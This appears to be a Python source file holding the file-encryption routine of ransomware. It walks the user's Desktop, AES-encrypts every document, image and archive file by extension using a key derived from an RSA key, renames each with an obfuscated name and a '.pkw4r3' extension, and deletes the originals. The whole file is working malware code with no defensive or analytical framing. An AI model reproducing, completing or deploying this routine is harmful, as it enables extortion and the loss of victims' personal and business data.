from aes_key_handle import *
from aes_on_single_file import *
from caesar_encrypt_decrypt import *

import os
def encrypt_files(rsa_key):

    aes_key = aes_gen_key(rsa_key)

    extensions=(".txt", ".jpg", ".doc", ".pdf", ".zip", ".7z");

    home = os.path.expanduser('~/Desktop')
    for root, dirs, files in os.walk(home+"\\"):
        for file in files:
            if file.lower().endswith(extensions):
                x = os.path.join(root, file)
                dir= os.path.dirname(os.path.abspath(x))
                aes_encrypt_file(x, aes_key )
                os.rename(x+".pkw4r3",dir+"\\"+caesar_shift(file,len(file)%26)+".pkw4r3")
                os.remove(x)
